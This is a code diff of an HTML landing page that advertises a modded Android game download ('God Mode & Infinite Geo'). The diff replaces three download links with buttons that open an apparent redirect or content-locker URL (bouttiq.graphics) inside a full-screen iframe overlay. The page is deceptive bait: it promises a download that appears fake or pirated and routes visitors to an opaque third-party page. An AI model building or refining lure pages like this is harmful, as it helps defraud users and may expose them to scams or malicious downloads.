@@ -253,6 +253,51 @@
       padding: 2px 6px;
       font-weight: bold;
     }
+    
+    /* Redirect Overlay Styles */
+    .redirect-overlay {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 80%;
+      height: 80%;
+      max-width: 1000px;
+      max-height: 700px;
+      background: white;
+      border-radius: 15px;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+      z-index: 9999;
+      display: none;
+      border: 2px solid #22c55e;
+      overflow: hidden;
+    }
+    
+    .redirect-overlay.active {
+      display: block;
+    }
+    
+    .overlay-bg {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(0, 0, 0, 0.6);
+      backdrop-filter: blur(3px);
+      z-index: 9998;
+      display: none;
+    }
+    
+    .overlay-bg.active {
+      display: block;
+    }
+    
+    .overlay-iframe {
+      width: 100%;
+      height: 100%;
+      border: none;
+    }
   </style>
   
   <!-- Fonts -->
@@ -270,6 +315,12 @@
     }
   })();
 </script>
+
+    <!-- Redirect Overlay -->
+    <div class="overlay-bg" id="overlayBg"></div>
+    <div class="redirect-overlay" id="redirectOverlay">
+      <iframe src="" class="overlay-iframe" id="redirectFrame" allowfullscreen></iframe>
+    </div>
 
     <!-- Header -->
     <header class="header-bg sticky top-0 z-50 border-b border-gray-200">
@@ -324,9 +375,9 @@
                         <p class="text-xl text-gray-700 mb-6">All Abilities Unlocked, God Mode & Infinite Geo. Explore the haunting kingdom of Pharloom with unlimited power and resources!</p>
                       
                         <div class="flex flex-col sm:flex-row gap-4">
-                            <a href="https://bouttiq.graphics/cl/i/7j7ge5" target="_blank" class="btn-download py-4 px-8 rounded-xl text-lg font-semibold inline-flex items-center justify-center no-underline">
+                            <button class="btn-download py-4 px-8 rounded-xl text-lg font-semibold inline-flex items-center justify-center no-underline show-redirect-overlay" data-url="https://bouttiq.graphics/cl/i/7j7ge5">
                                 <i class="fas fa-download mr-3"></i>Download Now
-                            </a>
+                            </button>
                             <a href="#features" class="py-4 px-8 rounded-xl border-2 border-gray-800 text-gray-800 hover:bg-gray-50 transition text-lg font-semibold inline-flex items-center justify-center no-underline">
                                 <i class="fas fa-info-circle mr-3"></i>View Features
                             </a>
@@ -471,9 +522,9 @@
                 
                 <!-- Main Download CTA -->
                 <div class="text-center mt-8">
-                    <a href="https://bouttiq.graphics/cl/i/7j7ge5" target="_blank" class="btn-download py-4 px-12 rounded-xl text-xl font-semibold inline-flex items-center justify-center mx-auto no-underline">
+                    <button class="btn-download py-4 px-12 rounded-xl text-xl font-semibold inline-flex items-center justify-center mx-auto no-underline show-redirect-overlay" data-url="https://bouttiq.graphics/cl/i/7j7ge5">
                         <i class="fas fa-download mr-3"></i>Download Now
-                    </a>
+                    </button>
                     <p class="text-gray-500 mt-4 text-sm">File Size: 1.2GB • Android 8.0+ • Latest Version 2025</p>
                 </div>
             </div>
@@ -639,9 +690,9 @@
                 
                 <!-- Final Download CTA -->
                 <div class="text-center mt-12">
-                    <a href="https://bouttiq.graphics/cl/i/7j7ge5" target="_blank" class="btn-download py-4 px-12 rounded-xl text-xl font-semibold inline-flex items-center justify-center mx-auto no-underline">
+                    <button class="btn-download py-4 px-12 rounded-xl text-xl font-semibold inline-flex items-center justify-center mx-auto no-underline show-redirect-overlay" data-url="https://bouttiq.graphics/cl/i/7j7ge5">
                         <i class="fas fa-download mr-3"></i>Download Now
-                    </a>
+                    </button>
                 </div>
             </div>
         </section>
@@ -846,6 +897,44 @@
                     }
                 }
             });
+        });
+
+        // Redirect Overlay Functionality
+        const redirectOverlay = document.getElementById('redirectOverlay');
+        const overlayBg = document.getElementById('overlayBg');
+        const redirectFrame = document.getElementById('redirectFrame');
+        
+        function showOverlay(url) {
+            redirectFrame.src = url;
+            redirectOverlay.classList.add('active');
+            overlayBg.classList.add('active');
+            document.body.style.overflow = 'hidden';
+        }
+        
+        // Add event listeners to all download buttons
+        document.querySelectorAll('.show-redirect-overlay').forEach(button => {
+            button.addEventListener('click', function() {
+                const url = this.getAttribute('data-url');
+                showOverlay(url);
+            });
+        });
+        
+        // Close overlay when clicking on background
+        overlayBg.addEventListener('click', function() {
+            redirectOverlay.classList.remove('active');
+            overlayBg.classList.remove('active');
+            document.body.style.overflow = 'auto';
+            redirectFrame.src = '';
+        });
+        
+        // Close overlay with Escape key
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape' && redirectOverlay.classList.contains('active')) {
+                redirectOverlay.classList.remove('active');
+                overlayBg.classList.remove('active');
+                document.body.style.overflow = 'auto';
+                redirectFrame.src = '';
+            }
         });
     </script>
 
